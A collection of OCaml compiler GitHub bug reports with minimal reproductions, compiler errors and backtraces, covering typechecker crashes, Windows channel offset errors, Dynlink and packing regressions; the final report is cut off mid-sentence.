[{"labels":["bug",null,null],"text":"Under Windows, files opened in text mode are subject to an implicit end-of-line translation (CRLF -> LF) performed by Windows itself.  This mode interacts badly with the implementation of OCaml channels (explanations for in_channel, but the same applies for out_channels):\r\n\r\n  - Upon reading, the internal channel->offset field is bumped by the number of character read, after the translation.  As a consequence, `Stdlib.pos_in` returns a number of bytes which does not correspond to real offsets in the file (let's call that a `virtual` offset).\r\n\r\n  - `Stdlib.seek_in` generally expects a \"real\" offset in the file, but (1) it doesn't perform an lseek if the target offset is already in the loaded buffer -- but it does this check based on the offset field, which use \"virtual\" offsets; (2) after calling lseek, it sets the `channel->offset` field to the requested offset, which is now a real offset, not a virtual one.  So the result of `pos_in` is not always a \"virtual\" offset either.\r\n\r\n  - Worse, `Stdlib.in_channel_length` restores the current reading offset calling `lseek` on `channel->offset`, which is usually wrong.  This means that calling that function can change the actual reading position.\r\n\r\nThe last point is demonstrated by the following program:\r\n````ocaml\r\nlet () =\r\n  let oc = open_out \"foo.txt\" in\r\n  for i = 1 to 3 do\r\n    Printf.fprintf oc \"%s\\n%!\" (String.make 50000 'x');\r\n  done;\r\n  close_out oc;\r\n\r\n  let ic = open_in \"foo.txt\" in\r\n  for i = 1 to 3 do\r\n    let s = input_line ic in\r\n    Printf.printf \"%i %i\\n%!\" (in_channel_length ic) (String.length s)\r\n  done;\r\n  close_in ic\r\n````\r\n\r\nwhich prints, under Windows:\r\n````\r\n150006 50000\r\n150006 50001\r\n150006 50001\r\n````\r\n\r\nThe programs reads lines of length 50001, although the file contains only line of length 50000.  Adapting the code to create 10 lines of length 15000, one gets:\r\n````\r\n150020 15000\r\n150020 15000\r\n150020 15000\r\n150020 15000\r\n150020 15004\r\n150020 15000\r\n150020 15000\r\n150020 15000\r\n150020 15004\r\n150020 15000\r\n````\r\n\r\nOne way to fix those problems would be to emulate the eol translation on our side, in order to get an offset field which corresponds to actual offsets in the files.  `pos_in` would then naturally returns a real offset, which could safely be passed to `seek_in`."},{"labels":["bug"],"text":"Attempting to build [prooftree](http://askra.de/software/prooftree/) 0.13 with OCaml 4.11.0 ends with an assertion failure:\r\n```\r\nocamlopt.opt -c -safe-string -w Aem-48 -g -I +lablgtk2 tree_layers.ml\r\nFatal error: exception File \"typing/ctype.ml\", line 4003, characters 6-12: Assertion failed\r\n```\r\nThis did not happen with OCaml 4.10.0 and earlier.  By commenting out code and retrying the ocamlopt invocation, I was able to identify this as the code that triggers the assertion (lines 292-296 of tree_layers.ml):\r\n```\r\n  method add_layer l =\r\n    layers <- layers @ [l];\r\n    l#register_layer_stack (self :> tree_layer abstract_tree_container);\r\n    self#clear_size_cache;\r\n    List.length layers - 1 \r\n```"},{"labels":["bug",null],"text":"`ocaml` (versions 4.09.0 and 4.11.0) fails on the following code:\r\n```ocaml\r\nmodule type Vector_space = sig\r\n  type t\r\n  type scalar\r\n  val scale : scalar -> t -> t\r\nend\r\n\r\nmodule type Scalar = sig\r\n  type t\r\n  include Vector_space with type t := t\r\n                        and type scalar = t\r\nend\r\n\r\nmodule type Linear_map = sig\r\n  type ('a, 'b) t\r\n  val scale :\r\n    (module Vector_space with type t = 'a and type scalar = 'l) ->\r\n    'l -> ('a, 'a) t\r\nend\r\n\r\nmodule Primitive(Linear_map : Linear_map) = struct\r\n  let f (type s) ((module S : Scalar with type t = s) as s) x =\r\n    Linear_map.scale s x\r\nend\r\n```\r\nwith the following exception:\r\n```sh\r\n$ocaml bug.ml\r\nFatal error: exception Ctype.Nondep_cannot_erase(_)\r\n```\r\nThis is my best effort to produce a minimal example, but there may well still be some useless bits."},{"labels":["bug"],"text":"Polymorphic type annotations generalize weak polymorphic variables, making such programs type check and segfault:\r\n```\r\nlet f x =\r\n  let ref : type a . a option ref = ref None in\r\n  ref := Some x;\r\n  Option.get !ref\r\n\r\nlet () = print_string (f 0)\r\n```\r\nThis program is rejected by OCaml 4.10 but is accepted by OCaml 4.11 and trunk. Bisection points to the commit c272447b1eff7829f42a8173059eb743754f1e4c."},{"labels":["bug"],"text":"This is a bug in 4.11.0+rc1:\r\n\r\n```\r\n$ ./install/bin/ocaml -short-paths\r\n        OCaml version 4.11.0+dev16-2020-08-04\r\n\r\n# type 'a t  = T;;\r\ntype 'a t = T\r\n# #show t;;\r\n>> Fatal error: Ident.rename t\r\nFatal error: exception Misc.Fatal_error\r\n```\r\n\r\nIt was apparently introduced by #9086, specifically this change:\r\n```diff\r\ndiff --git a/toplevel/topdirs.ml b/toplevel/topdirs.ml\r\nindex f4526692b6..78ab7eb51f 100644\r\n--- a/toplevel/topdirs.ml\r\n+++ b/toplevel/topdirs.ml\r\n@@ -545,15 +545,66 @@ let () =\r\n   reg_show_prim \"show_type\"\r\n     (fun env loc id lid ->\r\n        let _path, desc = Env.lookup_type ~loc lid env in\r\n-       [ Sig_type (id, desc, Trec_not, Exported) ]\r\n+       [ Sig_type (id, desc, Trec_first, Exported) ]\r\n     )\r\n     \"Print the signature of the corresponding type constructor.\"\r\n ```\r\n\r\nAfter this change, [`Printtyp.hide_rec_items`](https://github.com/ocaml/ocaml/blob/8905edd38223ef87c957a4fff03ebf0e437769fa/typing/printtyp.ml#L1623-L1634) attempts to rename persistent idents (i.e. `Ident.Global` values), which [fails](https://github.com/ocaml/ocaml/blob/8905edd38223ef87c957a4fff03ebf0e437769fa/typing/ident.ml#L58-L59) with the `Misc.Fatal_error` exception seen above.\r\n\r\nI haven't investigated further, but I expect the easiest fix is to revert the single-line change above to restore the previous behaviour (i.e. printing type definitions with a bogus `nonrec` rather than exiting the interpreter with a fatal error)."},{"labels":["bug",null,null],"text":"Noticed while adding support for 4.11 in merlin, reproducible with:\r\n```\r\n$ ./runtime/ocamlrun ./ocamlc -nostdlib -I stdlib -I utils -I parsing -I typing -principal -c ./typing/typedtree.ml\r\n$ ./runtime/ocamlrun ./ocamlc -nostdlib -I stdlib -I utils -I parsing -I typing -c ./typing/typedtree.ml\r\nFile \"./typing/typedtree.ml\", lines 793-808, characters 17-22:\r\n793 | .................match p.pat_desc with\r\n794 |   | Tpat_var (id, s) -> (* note the ``Not_found'' case *)\r\n795 |       {p with pat_desc =\r\n796 |        try Tpat_var (alpha_var env id, s) with\r\n797 |        | Not_found -> Tpat_any}\r\n...\r\n805 |   | d ->\r\n806 |      let pat_desc =\r\n807 |        shallow_map_pattern_desc { f = fun p -> alpha_pat env p } d in\r\n808 |      {p with pat_desc}\r\nError: This expression has type k pattern_desc pattern_data\r\n       but an expression was expected of type 'a \r\n       This instance of k is ambiguous:\r\n       it would escape the scope of its equation\r\n```\r\n\r\nThe code in question:\r\n```ocaml\r\nlet rec alpha_pat\r\n  : type k . _ -> k general_pattern -> k general_pattern\r\n  = fun env p -> match p.pat_desc with\r\n  | Tpat_var (id, s) -> (* note the ``Not_found'' case *)\r\n      {p with pat_desc =\r\n       try Tpat_var (alpha_var env id, s) with\r\n       | Not_found -> Tpat_any}\r\n  | Tpat_alias (p1, id, s) ->\r\n      let new_p =  alpha_pat env p1 in\r\n      begin try\r\n        {p with pat_desc = Tpat_alias (new_p, alpha_var env id, s)}\r\n      with\r\n      | Not_found -> new_p\r\n      end\r\n  | d ->\r\n     let pat_desc =\r\n       shallow_map_pattern_desc { f = fun p -> alpha_pat env p } d in\r\n     {p with pat_desc}\r\n```\r\nGiven the error message, it looks like the type annotation on the function is ignored.\r\nThis doesn't appear to be due to #1132 (I confirm that the bug also exists before that PR).\r\n\r\nIt could also be that this is just an issue with the printing of the error, that the expected type is in fact not ignored but that the level handling is incorrect in some place(s).\r\n\r\nNote: I'm going on vacation tonight, so IÂ won't be able to look at this before the end of next week. Anyone else should feel free to have a look."},{"labels":["bug"],"text":"I'm trying to get backtraces in simple test code:\r\n```\r\nlet f () = failwith \"test\"\r\nlet proc () = f ()\r\nlet () = proc ()\r\n```\r\nRunning `env OCAMLRUNPARAM=b ocaml test.ml`:\r\n```\r\nocaml --version\r\nThe OCaml toplevel, version 4.10.0\r\n```\r\n```\r\nException: Failure \"test\".\r\nRaised at file \"stdlib.ml\", line 29, characters 22-33\r\nCalled from unknown location\r\nCalled from file \"toplevel/toploop.ml\", line 212, characters 17-27\r\n```\r\nNotice the \"unknown location\"\r\n\r\nBut for older version location in source file was provided\r\n```\r\nocaml --version\r\nThe OCaml toplevel, version 4.05.0\r\n```\r\n```\r\nException: Failure \"test\".\r\nRaised at file \"pervasives.ml\", line 32, characters 22-33\r\nCalled from file \"./test.ml\", line 3, characters 9-16\r\nCalled from file \"toplevel/toploop.ml\", line 180, characters 17-56\r\n```\r\n\r\ndiscuss thread for reference: https://discuss.ocaml.org/t/backtraces-in-script-run-by-ocaml/5970\r\n"},{"labels":["bug"],"text":"The relaxing of the handling of polymorphic type in #1132 has unearthed a bug in the handling of polymorphic type unification when constraints are involved.\r\nFor example, the following code fails\r\n```ocaml\r\ntype 'p pair = 'a * 'b constraint 'p = < left:'a; right:'b>\r\nlet foo : \r\n  < m : 'left 'right. <left:'left; right:'right> pair > \r\n   -> < m : 'left 'right. <left:'left; right:'right> pair >\r\n= fun x -> x\r\n```\r\nfor OCaml version starting from at least version 4.01 .\r\n\r\nWith the heavier reliance on explicitly polymorphic type unification, the following code fails starting with 4.11 : \r\n```ocaml\r\ntype 'p pair = 'a * 'b constraint 'p = < left:'a; right:'b>\r\nlet error: 'left 'right.\r\n  <left:'left; right:'right> pair -> <left:'right; right:'left> pair =\r\n  fun (x,y) -> (y,x)\r\n```\r\nNote that this failure has been kind of observed in the wild, since it affects at least of my own library (and one that is not completely a toy): https://github.com/Octachron/orec/blob/master/src/namespace.ml#L307. "},{"labels":[null,"bug",null],"text":"OCAMLPARAM is parsed using a bespoke parser in `driver/compenv.ml` while command line arguments are parsed using the machinery in `utils/clflags.ml` and its dependencies, with the architecture-specific commands coming in from `driver/optmain.ml`.\r\n\r\nIdeally, `OCAMLPARAM` would reuse the same machinery as the command line.\r\n\r\nThis is especially irritating to me, right now, because I cannot easily pass `-flarge-toc` while building a variety of packages through `opam` on my ppc64le workstation.  It's very frustrating how many layers exist and are all fighting me in getting that one flag set!"},{"labels":["bug",null],"text":"The following program exhibits different behavior with the byte code compiler than with the native code compiler in OCaml 4.09.0 and 4.10.0:\r\n```ml\r\n(* loop_crash.ml *)\r\nmodule rec Id : sig\r\n  type t = {id : int}\r\n  val compare : t -> t -> int\r\nend = Id (* error here: undefined compare function *)\r\n\r\nmodule IdSet = Set.Make(Id)\r\n\r\nlet _ =\r\n  let basic_set = IdSet.singleton {id = 0} in\r\n  IdSet.mem {id = 1 } basic_set (* diverge here *)\r\n```\r\n\r\nIf I run this program with OCaml `ocaml loop_crash.ml`, the program diverges in the `IdSet.mem` function call.  If I compile the program `ocamlopt loop_crash.ml && ./a.out`, I get the expected `Undefined_recursive_module` exception.\r\n\r\nIt appears that this problem did not exist in OCaml 4.07.0.\r\n\r\nI tested this on both MacOS 10.14.6 and CentOS 7.7.1908."},{"labels":["bug"],"text":"perl4caml contains an old test which is literally called `001-start.ml`.  This fails to compile on x86-64 only with the new compiler:\r\n```\r\nocamlopt -w s -I wrappers -c test/001-start.ml\r\nFile \"test/001-start.ml\", line 1:\r\nWarning 24: bad source file name: \"001-start\" is not a valid module name.\r\n/tmp/camlasm8c525e.s: Assembler messages:\r\n/tmp/camlasm8c525e.s:59: Error: expected comma after name `caml001' in .size directive\r\nFile \"test/001-start.ml\", line 1:\r\nError: Assembler error, input left in file /tmp/camlasm8c525e.s\r\n```\r\nWhile we should obviously rename the test, this appears to be an unintentional regression."},{"labels":["bug",null],"text":"It's not the greatest code in the world, but ...\r\n\r\nhttps://github.com/libguestfs/libnbd/blob/0475bfe04a527051c0a37af59a733c4c8554e427/ocaml/tests/test_400_pread.ml#L21-L36\r\n\r\n... this code is supposed to create a `Bytes` containing this pattern of data: http://libguestfs.org/nbdkit-pattern-plugin.1.html#DESCRIPTION\r\n\r\nIt works in 4.10 (all architectures).  It also works on 4.11 (at commit 88a1bceb1b) on 64 bit architectures.\r\n\r\nHowever on armv7 and i686 it appears to produce a complete zero buffer, and I have no idea why.\r\n\r\nNote I'm also using the https://github.com/nojb/ocaml riscv patches on top, but I'm not sure if they could affect this."},{"labels":["bug"],"text":"When using 4.11.0~dev, trying to `opam install topkg` (or anything else using topfind) seems to break:\r\n\r\n```\r\n#=== ERROR while compiling topkg.1.0.1 ========================================#\r\n# context     2.0.4 | macos/x86_64 | ocaml-variants.4.11.0+trunk | file:///Users/avsm/src/git/ocaml/opam-repository\r\n# path        ~/.opam/devc2/.opam-switch/build/topkg.1.0.1\r\n# command     ~/.opam/opam-init/hooks/sandbox.sh build ocaml pkg/pkg.ml build --pkg-name topkg --dev-pkg false\r\n# exit-code   2\r\n# env-file    ~/.opam/log/topkg-34480-60c5c2.env\r\n# output-file ~/.opam/log/topkg-34480-60c5c2.out\r\n### output ###\r\n# [...]\r\n# File \"src/topkg_main.ml\", line 7, characters 5-17:\r\n# 7 | open Topkg_result\r\n#          ^^^^^^^^^^^^\r\n# Error: Unbound module Topkg_result\r\n# File \"src/topkg.ml\", line 9, characters 8-20:\r\n# 9 | include Topkg_result\r\n#             ^^^^^^^^^^^^\r\n# Error: Unbound module Topkg_result\r\n# File \"./pkg/pkg.ml\", line 27, characters 5-10:\r\n# 27 | open Topkg\r\n#           ^^^^^\r\n# Error: Unbound module Topkg\r\n```\r\n\r\n(I've not had a chance to bisect this further, but figured it's a serious enough regression to open up an issue early)."},{"labels":["bug",null],"text":"The following code raises Ctype.Cannot_apply:\r\n```\r\nmodule type X = sig\r\n  type 'a alpha = 'b constraint 'a = < alpha : 'b>\r\n\r\n  type 'a t =\r\n    { alpha : 'a alpha\r\n    }\r\n\r\n  module Make( ) : sig\r\n    type 'a pre := 'a t\r\n    type alpha\r\n    type t = < alpha : alpha >\r\n    val global : t pre\r\n  end\r\nend\r\n```\r\nIt works fine when using `type 'a pre = 'a t` instead of `type 'a pre := 'a t`"},{"labels":["bug",null],"text":"The following causes a stack overflow (in typing/ctype.ml, at recursive invocations of try_expand_head):\r\n\r\n```\r\ntype 'a alpha = 'b constraint 'a = < alpha : 'b>\r\ntype 'a beta = 'b constraint 'a = < beta : 'b>\r\n\r\ntype 'a gamma = 'b constraint 'a = < gamma : 'b; delta : _>\r\ntype 'a delta = 'b constraint 'a = < delta : 'b; gamma : _>\r\n\r\ntype 'a alpha_of_gamma = 'a gamma alpha\r\ntype 'a beta_of_delta = 'a delta beta\r\n\r\ntype ('a, 'b) alphabeta\r\n\r\nmodule Alphabeta = struct\r\n  type ('contains_beta, 'just_alpha) t = { alphabeta : ('just_alpha, 'contains_beta beta) alphabeta }\r\nend\r\n\r\ntype 'a t =\r\n  { other : int\r\n  ; alphabeta : ('a alpha_of_gamma, 'a beta_of_delta) alphabeta\r\n  }\r\n\r\nlet create\r\n      (input : ('a delta, 'a alpha_of_gamma) Alphabeta.t)\r\n  : 'a t\r\n  =\r\n  let t =\r\n    { other = 0 \r\n    ; alphabeta = input.alphabeta\r\n    }\r\n  in\r\n  t\r\n;;\r\n```\r\nHowever, when changing `let t =` to `let t : 'a t =`, it compiles just fine.\r\n\r\nNote that this is a reduced example from actual code, so it doesn't necessarily make a whole lot of sense. But I believe it should type-check.\r\n"},{"labels":["bug"],"text":"`links.0.9` does not compile with OCaml 4.10, after a bit of clean up, the following error message appears when compiling several modules, e.g.:\r\n```\r\nFile \"core/irTransform.ml\", line 1:\r\nError: Wrong file naming: /home/kit_ty_kate/.opam/4.10/lib/result/result.cmi\r\n       contains the compiled interface for  Result when result was expected\r\n```\r\nI tried to reproduce it with a smaller test case but I wasn't able to get one, so here is as far as I went in my debugging session:\r\n* [Persistent_env.acknowledge_pers_struct](https://github.com/ocaml/ocaml/blob/d47ba6ec18fc72d0aedabd162e373fecba2d7eaa/typing/persistent_env.ml#L168) gets called with `modname = \"result\"` and `ps.ps_name = \"Result\"`, I'm guessing `modname` should be a capitalized and something went wrong along the way.\r\n* The same modules that fail to compile do not if `-annot` is removed from the arguments.\r\n* Here is the command used and the call stack right before ocamlc fails:\r\n```\r\n$ gdb --args /home/kit_ty_kate/.opam/4.10/bin/ocamlc -annot -I core/.links_core.objs/byte -I /home/kit_ty_kate/.opam/4.10/lib/result -I lens/.links_lens.objs/byte -open Links_core -c core/irTransform.pp.ml\r\n[...]\r\n#0  camlPersistent_env__acknowledge_pers_struct_1703 () at typing/persistent_env.ml:168\r\n#1  0x00005555559145d9 in camlPersistent_env__find_pers_struct_1734 () at typing/persistent_env.ml:225\r\n#2  0x00005555559213a9 in camlEnv__lookup_ident_module_3330 () at typing/persistent_env.ml:264\r\n#3  0x000055555592255f in camlEnv__lookup_module_3434 () at typing/env.ml:2444\r\n#4  0x00005555559535a6 in camlPrinttyp__to_lookup_457 () at typing/printtyp.ml:84\r\n#5  0x00005555559549b4 in camlPrinttyp__env_ident_1642 () at typing/printtyp.ml:271\r\n#6  0x0000555555955065 in camlPrinttyp__ident_name_1670 () at typing/printtyp.ml:310\r\n#7  0x00005555559556ac in camlPrinttyp__tree_of_path_1720 () at typing/printtyp.ml:394\r\n#8  0x0000555555955736 in camlPrinttyp__tree_of_path_1720 () at typing/printtyp.ml:398\r\n#9  0x0000555555959b2c in camlPrinttyp__pr_typ_2291 () at typing/printtyp.ml:961\r\n#10 0x000055555595aab1 in camlPrinttyp__typexp_2400 () at typing/printtyp.ml:1098\r\n#11 0x000055555586629c in camlMisc__try_finally_inner_3884 () at utils/misc.ml:31\r\n#12 0x0000555555993732 in camlStypes__print_info_467 () at typing/stypes.ml:162\r\n#13 0x0000555555a624f8 in camlStdlib__list__fold_left_272 () at list.ml:121\r\n#14 0x0000555555993932 in camlStypes__do_dump_669 () at typing/stypes.ml:200\r\n#15 0x0000555555867cee in camlMisc__output_to_file_via_temporary_inner_4008 () at utils/misc.ml:355\r\n#16 0x0000555555993850 in camlStypes__dump_666 () at typing/stypes.ml:204\r\n#17 0x00005555558662ed in camlMisc__try_finally_inner_3884 () at utils/misc.ml:42\r\n#18 0x0000555555a5dbb8 in camlCompile_common__fun_1256 () at driver/compile_common.ml:123\r\n#19 0x000055555586629c in camlMisc__try_finally_inner_3884 () at utils/misc.ml:31\r\n#20 0x000055555586629c in camlMisc__try_finally_inner_3884 () at utils/misc.ml:31\r\n#21 0x000055555586629c in camlMisc__try_finally_inner_3884 () at utils/misc.ml:31\r\n#22 0x0000555555a41d3f in camlCompenv__process_action_896 () at driver/compenv.ml:597\r\n#23 0x0000555555a62441 in camlStdlib__list__iter_258 () at list.ml:110\r\n#24 0x0000555555a42673 in camlCompenv__process_deferred_actions_958 () at driver/compenv.ml:673\r\n#25 0x0000555555852663 in camlMain__main_1608 () at driver/main.ml:38\r\n#26 0x0000555555852b8b in camlMain__entry () at driver/main.ml:111\r\n#27 0x000055555584f059 in caml_program ()\r\n#28 0x0000555555ac7304 in caml_start_program ()\r\n#29 0x0000555555ac7afc in caml_startup_common (argv=0x7fffffffe5b8, pooling=<optimized out>, pooling@entry=0) at startup_nat.c:162\r\n#30 0x0000555555ac7b4b in caml_startup_exn (argv=<optimized out>) at startup_nat.c:172\r\n#31 caml_startup (argv=<optimized out>) at startup_nat.c:172\r\n#32 0x000055555584e64c in main (argc=<optimized out>, argv=<optimized out>) at main.c:44\r\n(gdb) c\r\nContinuing.\r\nResult <> result\r\nFile \"core/irTransform.ml\", line 1:\r\nError: Wrong file naming: /home/kit_ty_kate/.opam/4.10/lib/result/result.cmi\r\n       contains the compiled interface for  Result when result was expected\r\n```\r\n\r\nAnd I'm afraid that's all I have for now, I don't know enough about the internals of the compiler to guess where to poke further in a clever way. I might add more debug message to the functions shown above in the backtrace later but it might take some time so if someone here has a good enough guess that might speed up the debugging process.\r\n\r\nTo test it locally here are the necessary steps:\r\n```\r\n$ opam remote add alpha git://github.com/kit-ty-kate/opam-alpha-repository.git\r\n$ opam install --deps-only links.0.9\r\n$ git clone git://github.com/links-lang/links.git\r\n$ cd links\r\n$ dune build -p links --profile=dev\r\n```\r\n\r\nHappy new year!"},{"labels":["bug"],"text":"`nocrypto` currently fails on OCaml 4.10 with the following error message:\r\n```\r\n- + ocamlfind ocamldep -package zarith -package ppx_sexp_conv -package bytes -package sexplib -package cstruct -modules src/nocrypto.mli > src/nocrypto.mli.depends\r\n- File \"_none_\", line 1:\r\n- Error: Cannot load ppx_sexp_conv: error loading shared library: Dynlink.Error\r\n-        (Dynlink.Cannot_open_dll \"(Failure\\n \r\n-        \\\"/home/opam/.opam/4.10.0+trunk/lib/base/base.cmxs: undefined symbol:\r\n-        Base_internalhash_fold_float\\\")\")\r\n```\r\nTrying to debug the issue further made me write the following code:\r\n```\r\nlet () =\r\n  Dynlink.loadfile \"/home/opam/.opam/4.10.0+trunk/lib/sexplib0/sexplib0.cmxs\";\r\n  Dynlink.loadfile \"/home/opam/.opam/4.10.0+trunk/lib/base/base_internalhash_types/base_internalhash_types.cmxs\";\r\n  Dynlink.loadfile \"/home/opam/.opam/4.10.0+trunk/lib/base/caml/caml.cmxs\";\r\n  Dynlink.loadfile \"/home/opam/.opam/4.10.0+trunk/lib/base/shadow_stdlib/shadow_stdlib.cmxs\";\r\n  Dynlink.loadfile \"/home/opam/.opam/4.10.0+trunk/lib/base/base.cmxs\"\r\n```\r\nwhich compiles perfectly but fails with the same error:\r\n```\r\nFatal error: exception Dynlink.Error (Dynlink.Cannot_open_dll \"Dynlink.Error (Dynlink.Cannot_open_dll \\\"(Failure\\\\n  \\\\\\\"/home/opam/.opam/4.10.0+trunk/lib/base/base.cmxs: undefined symbol: Base_internalhash_fold_float\\\\\\\")\\\")\")\r\n```\r\nTrying to decompose the issue a bit further here is a very minimal test case:\r\n```\r\n$ cat test.c\r\nint testdynfail() {\r\n  return 0;\r\n}\r\n$ cat lib.ml\r\nexternal test : unit -> unit = \"testdynfail\"\r\n$ cat lib2.ml\r\nlet test = Lib.test\r\n$ cat dyn.ml\r\nlet () =\r\n  Dynlink.loadfile \"lib.cmxs\";\r\n  Dynlink.loadfile \"lib2.cmxs\"\r\n$ ocamlopt test.c\r\n$ ocamlmklib test.o -o test\r\n$ ocamlopt -shared -linkall -I . -cclib -ltest lib.ml -o lib.cmxs\r\n$ ocamlopt -shared -linkall lib2.ml -o lib2.cmxs\r\n$ ocamlopt -linkall dynlink.cmxa dyn.ml\r\n$ ./a.out\r\nFatal error: exception Dynlink.Error (Dynlink.Cannot_open_dll \"Dynlink.Error (Dynlink.Cannot_open_dll \\\"Failure(\\\\\\\"/tmp/dynlink-fail/lib2.cmxs: undefined symbol: testdynfail\\\\\\\")\\\")\")\r\n```\r\nThe same minimal test case works with OCaml 4.09.0 and older. I'm not really sure what changed in Dynlink since 4.09 but it now seems to drop the accessibility of C symbols between two calls to `Dynlink.loadfile`.\r\n\r\nIn case you need access to some of the packages required to test the compilation of `nocrypto` or `base` you might need the following opam overlay:\r\n```\r\n$ opam remote add alpha git://github.com/kit-ty-kate/opam-alpha-repository.git\r\n```"},{"labels":["bug"],"text":"```\r\n$ ocaml -dsource\r\n        OCaml version 4.08.0\r\n\r\n# module rec X = struct type t = int end;;\r\n\r\nFatal error: exception File \"parsing/pprintast.ml\", line 1398, characters 13-19: Assertion failed\r\n```"},{"labels":["bug"],"text":"Tested on 4.08.0 (no flambda). It compiles fine on 4.07.\r\n\r\n```\r\n% cat fortuna.ml \r\n% cat rng.ml \r\nmodule F = Fortuna\r\n% cat nocrypto.mli \r\nmodule Rng : sig\r\n  module F : sig end\r\nend\r\n% ocamlc -c -I src -o nocrypto.cmi nocrypto.mli\r\n% ocamlopt -c -for-pack Nocrypto -I src -o fortuna.cmx fortuna.ml\r\n% ocamlopt -c -for-pack Nocrypto -I src -o rng.cmx rng.ml\r\n% ocamlopt -pack -I src rng.cmx -o nocrypto.cmx\r\nFatal error: exception Invalid_argument(\"index out of bounds\")\r\nRaised by primitive operation at file \"asmcomp/closure.ml\", line 450, characters 45-50\r\nCalled from file \"asmcomp/closure.ml\", line 1040, characters 28-51\r\nCalled from file \"asmcomp/closure.ml\", line 978, characters 25-53\r\nCalled from file \"asmcomp/closure.ml\", line 1154, characters 27-46\r\nCalled from file \"asmcomp/closure.ml\", line 1056, characters 21-55\r\nCalled from file \"asmcomp/closure.ml\", line 987, characters 31-71\r\nCalled from file \"asmcomp/closure.ml\", line 1154, characters 27-46\r\nCalled from file \"asmcomp/closure.ml\", line 1056, characters 21-55\r\nCalled from file \"asmcomp/closure.ml\", line 987, characters 31-71\r\nCalled from file \"asmcomp/closure.ml\", line 978, characters 25-53\r\nCalled from file \"asmcomp/closure.ml\", line 1438, characters 24-57\r\nCalled from file \"asmcomp/asmgen.ml\", line 225, characters 16-71\r\nCalled from file \"utils/misc.ml\", line 31, characters 8-15\r\nRe-raised at file \"utils/misc.ml\", line 45, characters 10-56\r\nCalled from file \"asmcomp/asmgen.ml\", line 155, characters 7-231\r\nCalled from file \"utils/misc.ml\", line 31, characters 8-15\r\nRe-raised at file \"utils/misc.ml\", line 45, characters 10-56\r\nCalled from file \"asmcomp/asmgen.ml\" (inlined), line 261, characters 2-151\r\nCalled from file \"asmcomp/asmpackager.ml\", line 119, characters 6-187\r\nCalled from file \"utils/misc.ml\", line 31, characters 8-15\r\nRe-raised at file \"utils/misc.ml\", line 45, characters 10-56\r\nCalled from file \"asmcomp/asmpackager.ml\", line 231, characters 2-78\r\nCalled from file \"utils/misc.ml\", line 31, characters 8-15\r\nRe-raised at file \"utils/misc.ml\", line 45, characters 10-56\r\nCalled from file \"utils/misc.ml\", line 31, characters 8-15\r\nRe-raised at file \"utils/misc.ml\", line 45, characters 10-56\r\nCalled from file \"driver/optmain.ml\", line 298, characters 6-200\r\nRe-raised at file \"parsing/location.ml\", line 904, characters 14-25\r\nCalled from file \"driver/optmain.ml\", line 333, characters 6-37\r\nCalled from file \"driver/optmain.ml\", line 337, characters 2-9\r\n```"},{"labels":["bug",null],"text":"```\r\n# module M = struct type t = { x : int; y: char } end\r\n  let f (x : M.t) = { x with y = 'a' }\r\n  let g (x : M.t) = { x with y = 'a' } :: []\r\n  let h (x : M.t) = { x with y = 'a' } :: { x with y = 'b' } :: [];;\r\nLine 4, characters 40-58:\r\n4 | let h (x : M.t) = { x with y = 'a' } (* a *) :: { x with y = 'b' } (* b *):: [];;\r\n                                                    ^^^^^^^^^^^^^^^^^^\r\nWarning 18: this type-based record disambiguation is not principal.\r\nmodule M : sig type t = { x : int; y : char; } end\r\nval f : M.t -> M.t = <fun>\r\nval g : M.t -> M.t list = <fun>\r\nval h : M.t -> M.t list = <fun>\r\n```\r\n\r\nWe know principally that `x` is `M.t` (as illustrated by `(* a *)` and the other functions), so we shouldn't get a warning.\r\n\r\nWhat happens is this: we first typecheck `(* a *)`, at this point the expected type is a fresh variable, which can't be used to disambiguate the fields, so we look at the type of `x`.\r\nHowever for `(* b *)`, the expected type is `M.t`, which we can use to disambiguate, but it is not principally known.\r\n\r\nThis seems easy to fix: instead of first looking at the expected type, and then *if that fails* at the type of the expression; we should be looking at both."},{"labels":[null,"bug"],"text":"Assume two modules `A` and `B` located in subdirectories `foo` and `bar`. \r\n```\r\n$ cat foo/a.ml\r\nmodule type ARG = sig\r\n  type t\r\n  val f: t -> t -> t\r\nend\r\n\r\nmodule type RESULT = sig\r\n  type t\r\n  val f: t -> t -> t\r\nend\r\n\r\nmodule Make(X:ARG) : RESULT = struct\r\n  type t = X.t\r\n  let f = X.f\r\nend\r\n```\r\n```\r\n$ cat bar/b.ml\r\nmodule X = struct\r\n  type t = int\r\n  let f x = x\r\nend\r\n\r\nmodule Y = A.Make(X)\r\n```\r\nLet's compile them\r\n\r\n```\r\n$ cd foo; ocamlc -absname -c a.ml; cd ..\r\n$ cd bar; ocamlc -absname -I ../foo -c b.ml; cd ..\r\nFile \"/bar/b.ml\", line 6, characters 18-19:\r\nError: Signature mismatch:\r\n       Modules do not match:\r\n         sig type t = int val f : 'a -> 'a end\r\n       is not included in\r\n         A.ARG\r\n       Values do not match:\r\n         val f : 'a -> 'a\r\n       is not included in\r\n         val f : t -> t -> t\r\n       File \"/bar/a.ml\", line 3, characters 2-20:\r\n         Expected declaration\r\n       File \"/bar/b.ml\", line 3, characters 6-7:\r\n         Actual declaration\r\n```\r\n\r\nThe error message is incorrect as it indicates that file `a.ml` is in subdirectory `bar` whereas it is actually into subdirectory `foo`.\r\n"},{"labels":["bug"],"text":"The variance of constrained parameters is only checked, not fully inferred. This means that a type alias with constrained parameters can have a less general variance than the aliased type. For example:\r\n\r\n```ocaml\r\n# type 'a t = 'a constraint 'a = 'b list;;\r\ntype 'a t = 'a constraint 'a = 'b list\r\n```\r\nis treated as invariant in its parameter which basically means that `'b` is treated as invariant even though it is really covariant.\r\n\r\nThis means that the relaxed value restriction will not apply if the type is written with `t` but will apply otherwise. Since unification must arbitrarily choose between aliases this leads to non-principal behaviour:\r\n```ocaml\r\n# type 'a s = 'a list;;\r\ntype 'a s = 'a list\r\n\r\n# let x : [ `Foo of _ s | `Foo of 'a t ] = id (`Foo []);;\r\nval x : [ `Foo of 'a s ] = `Foo []\r\n\r\n# let x : [ `Foo of 'a t | `Foo of _ s ] = id (`Foo []);;\r\nval x : [ `Foo of '_weak24 list t ] = `Foo []\r\n```\r\nThis particular case can be fixed by annotating the definition of `t`:\r\n```ocaml\r\n# type +'a t = 'a constraint 'a = 'b list;;\r\ntype +'a t = 'a constraint 'a = 'b list\r\n```\r\nHowever, in general this doesn't work because a parameter may contain multiple type variables of different variance. For example:\r\n```ocaml\r\ntype 'a t = 'b -> 'c constraint 'a = 'b * 'c\r\n```\r\n\r\nI expect this is a known problem, and that there is no easy solution, but I thought it was worth reporting all the 